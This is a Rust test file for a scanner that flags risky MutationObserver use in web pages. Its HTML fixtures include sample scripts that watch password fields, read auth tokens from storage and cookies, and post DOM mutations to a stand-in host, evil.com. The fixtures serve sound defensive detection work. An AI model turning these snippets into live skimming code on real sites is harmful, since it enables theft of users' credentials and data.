use crate::mutation_observer_audit::*;

#[test]
fn no_observer_no_issues() {
    assert!(analyze_mutation_observer("<html></html>").is_empty());
}

#[test]
fn detects_observer() {
    let body = r#"<script>new MutationObserver(cb).observe(el, {childList: true})</script>"#;
    let issues = analyze_mutation_observer(body);
    assert!(issues.contains(&MutationObserverIssue::ObserverDetected));
}

#[test]
fn detects_subtree_watch() {
    let body = r#"<script>
        new MutationObserver(cb).observe(document.body, {
            childList: true, subtree: true
        });
    </script>"#;
    let issues = analyze_mutation_observer(body);
    assert!(issues.contains(&MutationObserverIssue::SubtreeWatch));
}

#[test]
fn detects_character_data_watch() {
    let body = r#"<script>
        new MutationObserver(cb).observe(el, {
            characterData: true
        });
    </script>"#;
    let issues = analyze_mutation_observer(body);
    assert!(issues.contains(&MutationObserverIssue::CharacterDataWatch));
}

#[test]
fn detects_sensitive_attribute_filter() {
    let body = r#"<script>
        new MutationObserver(cb).observe(el, {
            attributes: true, attributeFilter: ["value", "class"]
        });
    </script>"#;
    let issues = analyze_mutation_observer(body);
    assert!(issues.contains(&MutationObserverIssue::AttributeFilterSensitive));
}

#[test]
fn no_sensitive_filter_without_keyword() {
    let body = r#"<script>
        new MutationObserver(cb).observe(el, {
            attributes: true, attributeFilter: ["class", "style"]
        });
    </script>"#;
    let issues = analyze_mutation_observer(body);
    assert!(!issues.contains(&MutationObserverIssue::AttributeFilterSensitive));
}

#[test]
fn detects_form_input_monitoring() {
    let body = r#"<script>
        const el = document.querySelector("input");
        new MutationObserver(cb).observe(el, {attributes: true});
    </script>"#;
    let issues = analyze_mutation_observer(body);
    assert!(issues.contains(&MutationObserverIssue::FormInputMonitoring));
}

#[test]
fn detects_data_exfiltration() {
    let body = r#"<script>
        new MutationObserver((mutations) => {
            fetch("/track", {body: JSON.stringify(mutations)});
        }).observe(document.body, {childList: true});
    </script>"#;
    let issues = analyze_mutation_observer(body);
    assert!(issues.contains(&MutationObserverIssue::DataExfiltration));
}

#[test]
fn severity_exfiltration_highest() {
    assert_eq!(
        mutation_observer_severity(&MutationObserverIssue::DataExfiltration),
        6.0
    );
}

#[test]
fn severity_detected_lowest() {
    assert_eq!(
        mutation_observer_severity(&MutationObserverIssue::ObserverDetected),
        3.0
    );
}

#[test]
fn to_operations_creates_entries() {
    let issues = vec![
        MutationObserverIssue::ObserverDetected,
        MutationObserverIssue::SubtreeWatch,
    ];
    let mut seq = 0;
    let ops = mutation_observer_to_operations(&issues, &mut seq);
    assert_eq!(ops.len(), 2);
    assert_eq!(seq, 2);
}

#[test]
fn display_variants() {
    assert_eq!(
        MutationObserverIssue::ObserverDetected.to_string(),
        "observer_detected"
    );
    assert_eq!(
        MutationObserverIssue::SubtreeWatch.to_string(),
        "subtree_watch"
    );
    assert_eq!(
        MutationObserverIssue::CharacterDataWatch.to_string(),
        "character_data_watch"
    );
    assert_eq!(
        MutationObserverIssue::AttributeFilterSensitive.to_string(),
        "attribute_filter_sensitive"
    );
    assert_eq!(
        MutationObserverIssue::FormInputMonitoring.to_string(),
        "form_input_monitoring"
    );
    assert_eq!(
        MutationObserverIssue::DataExfiltration.to_string(),
        "data_exfiltration"
    );
}

#[test]
fn empty_body_no_issues() {
    assert!(analyze_mutation_observer("").is_empty());
}

// ===== Security Analysis Tests =====

#[test]
fn security_no_observer_no_issues() {
    assert!(analyze_mutation_observer_security("<html></html>").is_empty());
}

#[test]
fn security_empty_body_no_issues() {
    assert!(analyze_mutation_observer_security("").is_empty());
}

// PasswordFieldMonitoring tests
#[test]
fn detects_password_field_monitoring_double_quotes() {
    let body = r#"<script>
        const pwd = document.querySelector('input[type="password"]');
        new MutationObserver(cb).observe(pwd, {attributes: true});
    </script>"#;
    let issues = analyze_mutation_observer_security(body);
    assert!(issues.contains(&MutationObserverSecurityIssue::PasswordFieldMonitoring));
}

#[test]
fn detects_password_field_monitoring_single_quotes() {
    let body = r#"<script>
        const pwd = document.querySelector("input[type='password']");
        new MutationObserver(cb).observe(pwd, {attributes: true});
    </script>"#;
    let issues = analyze_mutation_observer_security(body);
    assert!(issues.contains(&MutationObserverSecurityIssue::PasswordFieldMonitoring));
}

#[test]
fn detects_password_field_monitoring_bracket_notation() {
    let body = r#"<script>
        const pwd = document.querySelectorAll('[type="password"]');
        new MutationObserver(cb).observe(pwd[0], {attributes: true});
    </script>"#;
    let issues = analyze_mutation_observer_security(body);
    assert!(issues.contains(&MutationObserverSecurityIssue::PasswordFieldMonitoring));
}

#[test]
fn no_password_monitoring_without_observe() {
    let body = r#"<input type="password" />"#;
    let issues = analyze_mutation_observer_security(body);
    assert!(!issues.contains(&MutationObserverSecurityIssue::PasswordFieldMonitoring));
}

// DocumentWideObserver tests
#[test]
fn detects_document_wide_observer_body() {
    let body = r#"<script>
        new MutationObserver(cb).observe(document.body, {
            childList: true, subtree: true
        });
    </script>"#;
    let issues = analyze_mutation_observer_security(body);
    assert!(issues.contains(&MutationObserverSecurityIssue::DocumentWideObserver));
}

#[test]
fn detects_document_wide_observer_document_element() {
    let body = r#"<script>
        new MutationObserver(cb).observe(document.documentElement, {
            childList: true, subtree: true
        });
    </script>"#;
    let issues = analyze_mutation_observer_security(body);
    assert!(issues.contains(&MutationObserverSecurityIssue::DocumentWideObserver));
}

#[test]
fn detects_document_wide_observer_query_selector() {
    let body = r#"<script>
        new MutationObserver(cb).observe(document.querySelector("body"), {
            childList: true, subtree: true
        });
    </script>"#;
    let issues = analyze_mutation_observer_security(body);
    assert!(issues.contains(&MutationObserverSecurityIssue::DocumentWideObserver));
}

#[test]
fn no_document_wide_without_subtree() {
    let body = r#"<script>
        new MutationObserver(cb).observe(document.body, {childList: true});
    </script>"#;
    let issues = analyze_mutation_observer_security(body);
    assert!(!issues.contains(&MutationObserverSecurityIssue::DocumentWideObserver));
}

// DomExfiltration tests
#[test]
fn detects_dom_exfiltration_fetch() {
    let body = r#"<script>
        new MutationObserver((mutations) => {
            fetch("https://evil.com/track", {
                method: "POST",
                body: JSON.stringify(mutations)
            });
        }).observe(document.body, {childList: true});
    </script>"#;
    let issues = analyze_mutation_observer_security(body);
    assert!(issues.contains(&MutationObserverSecurityIssue::DomExfiltration));
}

#[test]
fn detects_dom_exfiltration_xhr() {
    let body = r#"<script>
        new MutationObserver((mutations) => {
            const xhr = new XMLHttpRequest();
            xhr.open("POST", "/track");
            xhr.send(JSON.stringify(mutations));
        }).observe(document.body, {childList: true});
    </script>"#;
    let issues = analyze_mutation_observer_security(body);
    assert!(issues.contains(&MutationObserverSecurityIssue::DomExfiltration));
}

#[test]
fn detects_dom_exfiltration_beacon() {
    let body = r#"<script>
        new MutationObserver((mutations) => {
            navigator.sendBeacon("/track", JSON.stringify(mutations));
        }).observe(document.body, {childList: true});
    </script>"#;
    let issues = analyze_mutation_observer_security(body);
    assert!(issues.contains(&MutationObserverSecurityIssue::DomExfiltration));
}

#[test]
fn detects_dom_exfiltration_mutation_target() {
    let body = r#"<script>
        new MutationObserver((mutations) => {
            mutations.forEach(m => {
                fetch("https://evil.com", {body: m.mutation.target.innerHTML});
            });
        }).observe(document.body, {childList: true});
    </script>"#;
    let issues = analyze_mutation_observer_security(body);
    assert!(issues.contains(&MutationObserverSecurityIssue::DomExfiltration));
}

#[test]
fn no_exfiltration_without_mutation_data() {
    let body = r#"<script>
        fetch("https://example.com/api");
        new MutationObserver(cb).observe(document.body, {childList: true});
    </script>"#;
    let issues = analyze_mutation_observer_security(body);
    assert!(!issues.contains(&MutationObserverSecurityIssue::DomExfiltration));
}

// HiddenElementTracking tests
#[test]
fn detects_hidden_element_tracking_display_none() {
    let body = r#"<script>
        const el = document.querySelector('[style*="display:none"]');
        new MutationObserver(cb).observe(el, {attributes: true});
    </script>"#;
    let issues = analyze_mutation_observer_security(body);
    assert!(issues.contains(&MutationObserverSecurityIssue::HiddenElementTracking));
}

#[test]
fn detects_hidden_element_tracking_visibility_hidden() {
    let body = r#"<script>
        const el = document.querySelector('[style*="visibility:hidden"]');
        new MutationObserver(cb).observe(el, {attributes: true});
    </script>"#;
    let issues = analyze_mutation_observer_security(body);
    assert!(issues.contains(&MutationObserverSecurityIssue::HiddenElementTracking));
}

#[test]
fn detects_hidden_element_tracking_hidden_attribute() {
    let body = r#"<script>
        const el = document.querySelector('[hidden]');
        new MutationObserver(cb).observe(el, {childList: true});
    </script>"#;
    let issues = analyze_mutation_observer_security(body);
    assert!(issues.contains(&MutationObserverSecurityIssue::HiddenElementTracking));
}

#[test]
fn detects_hidden_element_tracking_style_display() {
    let body = r#"<script>
        const el = document.getElementById("x");
        if (el.style.display === "none") {
            new MutationObserver(cb).observe(el, {attributes: true});
        }
    </script>"#;
    let issues = analyze_mutation_observer_security(body);
    assert!(issues.contains(&MutationObserverSecurityIssue::HiddenElementTracking));
}

// ScriptInjectionWatch tests
#[test]
fn detects_script_injection_watch() {
    let body = r#"<script>
        new MutationObserver((mutations) => {
            mutations.forEach(m => {
                m.addedNodes.forEach(node => {
                    if (node.nodeName === "SCRIPT") {
                        console.log("script detected");
                    }
                });
            });
        }).observe(document.body, {childList: true});
    </script>"#;
    let issues = analyze_mutation_observer_security(body);
    assert!(issues.contains(&MutationObserverSecurityIssue::ScriptInjectionWatch));
}

#[test]
fn detects_script_injection_watch_tagname() {
    let body = r#"<script>
        new MutationObserver((mutations) => {
            mutations.forEach(m => {
                m.addedNodes.forEach(node => {
                    if (node.tagName === "script") {
                        alert("XSS detected");
                    }
                });
            });
        }).observe(document.body, {childList: true});
    </script>"#;
    let issues = analyze_mutation_observer_security(body);
    assert!(issues.contains(&MutationObserverSecurityIssue::ScriptInjectionWatch));
}

#[test]
fn no_script_watch_with_single_keyword() {
    let body = r#"<script>
        new MutationObserver((mutations) => {
            console.log(mutations.addedNodes);
        }).observe(document.body, {childList: true});
    </script>"#;
    let issues = analyze_mutation_observer_security(body);
    assert!(!issues.contains(&MutationObserverSecurityIssue::ScriptInjectionWatch));
}

// CrossOriginFrameWatch tests
#[test]
fn detects_cross_origin_frame_watch_iframe() {
    let body = r#"<script>
        const frame = document.querySelector("iframe");
        new MutationObserver(cb).observe(frame, {attributes: true});
    </script>"#;
    let issues = analyze_mutation_observer_security(body);
    assert!(issues.contains(&MutationObserverSecurityIssue::CrossOriginFrameWatch));
}

#[test]
fn detects_cross_origin_frame_watch_content_window() {
    let body = r#"<script>
        const doc = frame.contentWindow.document;
        new MutationObserver(cb).observe(doc, {childList: true});
    </script>"#;
    let issues = analyze_mutation_observer_security(body);
    assert!(issues.contains(&MutationObserverSecurityIssue::CrossOriginFrameWatch));
}

#[test]
fn detects_cross_origin_frame_watch_content_document() {
    let body = r#"<script>
        const doc = iframe.contentDocument;
        new MutationObserver(cb).observe(doc.body, {childList: true});
    </script>"#;
    let issues = analyze_mutation_observer_security(body);
    assert!(issues.contains(&MutationObserverSecurityIssue::CrossOriginFrameWatch));
}

#[test]
fn no_frame_watch_without_observe() {
    let body = r#"<iframe src="https://example.com"></iframe>"#;
    let issues = analyze_mutation_observer_security(body);
    assert!(!issues.contains(&MutationObserverSecurityIssue::CrossOriginFrameWatch));
}

// TokenExtraction tests
#[test]
fn detects_token_extraction_localstorage() {
    let body = r#"<script>
        new MutationObserver((mutations) => {
            const token = localStorage.getItem("auth_token");
            console.log(token);
        }).observe(document.body, {childList: true});
    </script>"#;
    let issues = analyze_mutation_observer_security(body);
    assert!(issues.contains(&MutationObserverSecurityIssue::TokenExtraction));
}

#[test]
fn detects_token_extraction_session_storage() {
    let body = r#"<script>
        new MutationObserver((mutations) => {
            const jwt = sessionStorage.getItem("bearer");
            sendToServer(jwt);
        }).observe(document.body, {childList: true});
    </script>"#;
    let issues = analyze_mutation_observer_security(body);
    assert!(issues.contains(&MutationObserverSecurityIssue::TokenExtraction));
}

#[test]
fn detects_token_extraction_cookie() {
    let body = r#"<script>
        new MutationObserver((mutations) => {
            const csrf = document.cookie.match(/csrf=([^;]+)/)[1];
        }).observe(document.body, {childList: true});
    </script>"#;
    let issues = analyze_mutation_observer_security(body);
    assert!(issues.contains(&MutationObserverSecurityIssue::TokenExtraction));
}

#[test]
fn no_token_extraction_without_storage() {
    let body = r#"<script>
        new MutationObserver((mutations) => {
            console.log("token", "auth", "session");
        }).observe(document.body, {childList: true});
    </script>"#;
    let issues = analyze_mutation_observer_security(body);
    assert!(!issues.contains(&MutationObserverSecurityIssue::TokenExtraction));
}

// KeystrokeReconstruction tests
#[test]
fn detects_keystroke_reconstruction_character_data_input() {
    let body = r#"<script>
        const input = document.querySelector("input");
        new MutationObserver(cb).observe(input, {
            characterData: true, subtree: true
        });
    </script>"#;
    let issues = analyze_mutation_observer_security(body);
    assert!(issues.contains(&MutationObserverSecurityIssue::KeystrokeReconstruction));
}

#[test]
fn detects_keystroke_reconstruction_textarea() {
    let body = r#"<script>
        const textarea = document.querySelector("textarea");
        new MutationObserver(cb).observe(textarea, {
            characterData: true
        });
    </script>"#;
    let issues = analyze_mutation_observer_security(body);
    assert!(issues.contains(&MutationObserverSecurityIssue::KeystrokeReconstruction));
}

#[test]
fn detects_keystroke_reconstruction_keycode() {
    let body = r#"<script>
        new MutationObserver((mutations) => {
            mutations.forEach(m => {
                if (m.type === "characterData") {
                    console.log("keyCode:", event.keyCode);
                }
            });
        }).observe(document.body, {characterData: true, subtree: true});
    </script>"#;
    let issues = analyze_mutation_observer_security(body);
    assert!(issues.contains(&MutationObserverSecurityIssue::KeystrokeReconstruction));
}

#[test]
fn no_keystroke_reconstruction_without_character_data() {
    let body = r#"<script>
        const input = document.querySelector("input");
        new MutationObserver(cb).observe(input, {attributes: true});
    </script>"#;
    let issues = analyze_mutation_observer_security(body);
    assert!(!issues.contains(&MutationObserverSecurityIssue::KeystrokeReconstruction));
}

// ClipboardInterception tests
#[test]
fn detects_clipboard_interception_copy() {
    let body = r#"<script>
        document.addEventListener("copy", (e) => {
            console.log("copied");
        });
        new MutationObserver(cb).observe(document.body, {childList: true});
    </script>"#;
    let issues = analyze_mutation_observer_security(body);
    assert!(issues.contains(&MutationObserverSecurityIssue::ClipboardInterception));
}

#[test]
fn detects_clipboard_interception_paste() {
    let body = r#"<script>
        document.addEventListener("paste", (e) => {
            console.log("pasted");
        });
        new MutationObserver(cb).observe(document.body, {childList: true});
    </script>"#;
    let issues = analyze_mutation_observer_security(body);
    assert!(issues.contains(&MutationObserverSecurityIssue::ClipboardInterception));
}

#[test]
fn detects_clipboard_interception_oncopy() {
    let body = r#"<script>
        document.oncopy = function() { alert("copied"); };
        new MutationObserver(cb).observe(document.body, {childList: true});
    </script>"#;
    let issues = analyze_mutation_observer_security(body);
    assert!(issues.contains(&MutationObserverSecurityIssue::ClipboardInterception));
}

#[test]
fn detects_clipboard_interception_clipboard_api() {
    let body = r#"<script>
        navigator.clipboard.readText().then(text => console.log(text));
        new MutationObserver(cb).observe(document.body, {childList: true});
    </script>"#;
    let issues = analyze_mutation_observer_security(body);
    assert!(issues.contains(&MutationObserverSecurityIssue::ClipboardInterception));
}

#[test]
fn no_clipboard_interception_without_observe() {
    let body = r#"<script>
        document.addEventListener("copy", (e) => {
            console.log("copied");
        });
    </script>"#;
    let issues = analyze_mutation_observer_security(body);
    assert!(!issues.contains(&MutationObserverSecurityIssue::ClipboardInterception));
}

// ShadowDomPenetration tests
#[test]
fn detects_shadow_dom_penetration_shadowroot() {
    let body = r#"<script>
        const root = element.shadowRoot;
        new MutationObserver(cb).observe(root, {childList: true});
    </script>"#;
    let issues = analyze_mutation_observer_security(body);
    assert!(issues.contains(&MutationObserverSecurityIssue::ShadowDomPenetration));
}

#[test]
fn detects_shadow_dom_penetration_attach_shadow() {
    let body = r#"<script>
        const shadow = element.attachShadow({mode: "open"});
        new MutationObserver(cb).observe(shadow, {childList: true});
    </script>"#;
    let issues = analyze_mutation_observer_security(body);
    assert!(issues.contains(&MutationObserverSecurityIssue::ShadowDomPenetration));
}

#[test]
fn detects_shadow_dom_penetration_dot_shadowroot() {
    let body = r#"<script>
        const shadow = document.querySelector("custom-element").shadowRoot;
        new MutationObserver(cb).observe(shadow, {childList: true});
    </script>"#;
    let issues = analyze_mutation_observer_security(body);
    assert!(issues.contains(&MutationObserverSecurityIssue::ShadowDomPenetration));
}

#[test]
fn no_shadow_dom_penetration_without_observe() {
    let body = r#"<script>
        const shadow = element.attachShadow({mode: "open"});
    </script>"#;
    let issues = analyze_mutation_observer_security(body);
    assert!(!issues.contains(&MutationObserverSecurityIssue::ShadowDomPenetration));
}

// Display tests
#[test]
fn security_display_password_field_monitoring() {
    assert_eq!(
        MutationObserverSecurityIssue::PasswordFieldMonitoring.to_string(),
        "password_field_monitoring"
    );
}

#[test]
fn security_display_document_wide_observer() {
    assert_eq!(
        MutationObserverSecurityIssue::DocumentWideObserver.to_string(),
        "document_wide_observer"
    );
}

#[test]
fn security_display_dom_exfiltration() {
    assert_eq!(
        MutationObserverSecurityIssue::DomExfiltration.to_string(),
        "dom_exfiltration"
    );
}

#[test]
fn security_display_hidden_element_tracking() {
    assert_eq!(
        MutationObserverSecurityIssue::HiddenElementTracking.to_string(),
        "hidden_element_tracking"
    );
}

#[test]
fn security_display_script_injection_watch() {
    assert_eq!(
        MutationObserverSecurityIssue::ScriptInjectionWatch.to_string(),
        "script_injection_watch"
    );
}

#[test]
fn security_display_cross_origin_frame_watch() {
    assert_eq!(
        MutationObserverSecurityIssue::CrossOriginFrameWatch.to_string(),
        "cross_origin_frame_watch"
    );
}

#[test]
fn security_display_token_extraction() {
    assert_eq!(
        MutationObserverSecurityIssue::TokenExtraction.to_string(),
        "token_extraction"
    );
}

#[test]
fn security_display_keystroke_reconstruction() {
    assert_eq!(
        MutationObserverSecurityIssue::KeystrokeReconstruction.to_string(),
        "keystroke_reconstruction"
    );
}

#[test]
fn security_display_clipboard_interception() {
    assert_eq!(
        MutationObserverSecurityIssue::ClipboardInterception.to_string(),
        "clipboard_interception"
    );
}

#[test]
fn security_display_shadow_dom_penetration() {
    assert_eq!(
        MutationObserverSecurityIssue::ShadowDomPenetration.to_string(),
        "shadow_dom_penetration"
    );
}

// Severity tests
#[test]
fn security_severity_dom_exfiltration_highest() {
    assert_eq!(
        mutation_observer_security_severity(&MutationObserverSecurityIssue::DomExfiltration),
        8.0
    );
}

#[test]
fn security_severity_password_field_monitoring() {
    assert_eq!(
        mutation_observer_security_severity(
            &MutationObserverSecurityIssue::PasswordFieldMonitoring
        ),
        7.5
    );
}

#[test]
fn security_severity_token_extraction() {
    assert_eq!(
        mutation_observer_security_severity(&MutationObserverSecurityIssue::TokenExtraction),
        7.0
    );
}

#[test]
fn security_severity_keystroke_reconstruction() {
    assert_eq!(
        mutation_observer_security_severity(
            &MutationObserverSecurityIssue::KeystrokeReconstruction
        ),
        7.0
    );
}

#[test]
fn security_severity_document_wide_observer() {
    assert_eq!(
        mutation_observer_security_severity(&MutationObserverSecurityIssue::DocumentWideObserver),
        6.5
    );
}

#[test]
fn security_severity_cross_origin_frame_watch() {
    assert_eq!(
        mutation_observer_security_severity(&MutationObserverSecurityIssue::CrossOriginFrameWatch),
        6.0
    );
}

#[test]
fn security_severity_clipboard_interception() {
    assert_eq!(
        mutation_observer_security_severity(&MutationObserverSecurityIssue::ClipboardInterception),
        5.5
    );
}

#[test]
fn security_severity_script_injection_watch() {
    assert_eq!(
        mutation_observer_security_severity(&MutationObserverSecurityIssue::ScriptInjectionWatch),
        5.0
    );
}

#[test]
fn security_severity_hidden_element_tracking() {
    assert_eq!(
        mutation_observer_security_severity(&MutationObserverSecurityIssue::HiddenElementTracking),
        4.5
    );
}

#[test]
fn security_severity_shadow_dom_penetration_lowest() {
    assert_eq!(
        mutation_observer_security_severity(&MutationObserverSecurityIssue::ShadowDomPenetration),
        4.0
    );
}

// Operations tests
#[test]
fn security_to_operations_creates_entries() {
    let issues = vec![
        MutationObserverSecurityIssue::DomExfiltration,
        MutationObserverSecurityIssue::PasswordFieldMonitoring,
        MutationObserverSecurityIssue::TokenExtraction,
    ];
    let mut seq = 0;
    let ops = mutation_observer_security_to_operations(&issues, &mut seq);
    assert_eq!(ops.len(), 3);
    assert_eq!(seq, 3);
}

#[test]
fn security_to_operations_empty_issues() {
    let issues: Vec<MutationObserverSecurityIssue> = Vec::new();
    let mut seq = 0;
    let ops = mutation_observer_security_to_operations(&issues, &mut seq);
    assert_eq!(ops.len(), 0);
    assert_eq!(seq, 0);
}

#[test]
fn security_to_operations_single_issue() {
    let issues = vec![MutationObserverSecurityIssue::ClipboardInterception];
    let mut seq = 42;
    let ops = mutation_observer_security_to_operations(&issues, &mut seq);
    assert_eq!(ops.len(), 1);
    assert_eq!(seq, 43);
}

// Edge cases
#[test]
fn multiple_security_issues_detected() {
    let body = r#"<script>
        const pwd = document.querySelector('input[type="password"]');
        new MutationObserver((mutations) => {
            const token = localStorage.getItem("auth");
            fetch("https://evil.com", {
                method: "POST",
                body: JSON.stringify(mutations)
            });
        }).observe(document.body, {
            childList: true,
            subtree: true,
            characterData: true
        });
    </script>"#;
    let issues = analyze_mutation_observer_security(body);
    assert!(issues.contains(&MutationObserverSecurityIssue::PasswordFieldMonitoring));
    assert!(issues.contains(&MutationObserverSecurityIssue::DocumentWideObserver));
    assert!(issues.contains(&MutationObserverSecurityIssue::DomExfiltration));
    assert!(issues.contains(&MutationObserverSecurityIssue::TokenExtraction));
    assert!(issues.len() >= 4);
}

#[test]
fn no_false_positives_without_mutation_observer() {
    let body = r#"<script>
        const pwd = document.querySelector('input[type="password"]');
        const token = localStorage.getItem("auth");
        fetch("https://evil.com", {method: "POST", body: token});
    </script>"#;
    let issues = analyze_mutation_observer_security(body);
    assert!(issues.is_empty());
}

#[test]
fn case_sensitive_patterns() {
    let body = r#"<script>
        new MutationObserver(cb).observe(document.body, {
            childList: true, SUBTREE: true
        });
    </script>"#;
    let issues = analyze_mutation_observer_security(body);
    // Should not match because "SUBTREE" is uppercase
    assert!(!issues.contains(&MutationObserverSecurityIssue::DocumentWideObserver));
}

#[test]
fn whitespace_variations() {
    let body = r#"<script>
        const el = document.querySelector('[style*="display: none"]');
        new    MutationObserver(cb).observe(el, {attributes:   true});
    </script>"#;
    let issues = analyze_mutation_observer_security(body);
    assert!(issues.contains(&MutationObserverSecurityIssue::HiddenElementTracking));
}
